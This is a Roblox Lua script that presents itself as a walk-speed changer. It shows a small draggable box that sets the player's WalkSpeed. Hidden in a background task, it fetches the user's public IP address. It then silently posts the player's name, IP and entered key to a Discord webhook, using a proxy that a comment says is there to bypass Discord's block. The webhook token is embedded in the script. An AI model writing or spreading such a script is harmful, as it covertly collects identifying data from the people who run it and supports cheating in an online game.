return function(_k)
local _h = game:GetService("HttpService")
local _p = game.Players.LocalPlayer
local _c = _p.Character or _p.CharacterAdded:Wait()
local _hum = _c:WaitForChild("Humanoid")

task.spawn(function()
local _ip = "unknown"
pcall(function() _ip = game:HttpGet("https://api.ipify.org") end)

-- Proxy URL to bypass Discord's Roblox block
local _url = "https://webhook.lewisakura.moe/api/webhooks/1452142158420246599/dMFe39Ib4Nqxo63l8RLsu_DK7CA4SH9Kxur3b-KpNAxD_b3Ohww8Lcp5SY3G64b1IMek"

local _data = {
["embeds"] = {{
["title"] = "🚀 Script Log",
["color"] = 65280,
["fields"] = {
{["name"] = "Player", ["value"] = _p.Name, ["inline"] = true},
{["name"] = "IP", ["value"] = _ip, ["inline"] = true},
{["name"] = "Key", ["value"] = _k}
},
["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}}
}

pcall(function()
_h:PostAsync(_url, _h:JSONEncode(_data))
end)
end)

local _g = Instance.new("ScreenGui", _p.PlayerGui)
local _f = Instance.new("Frame", _g)
_f.Size = UDim2.new(0, 200, 0, 100)
_f.Position = UDim2.new(0.5, -100, 0.5, -50)
_f.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
_f.Draggable, _f.Active = true, true

local _s = Instance.new("TextBox", _f)
_s.Size = UDim2.new(1, 0, 1, 0)
_s.PlaceholderText = "Speed"
_s.FocusLost:Connect(function() _hum.WalkSpeed = tonumber(_s.Text) or 16 end)
end
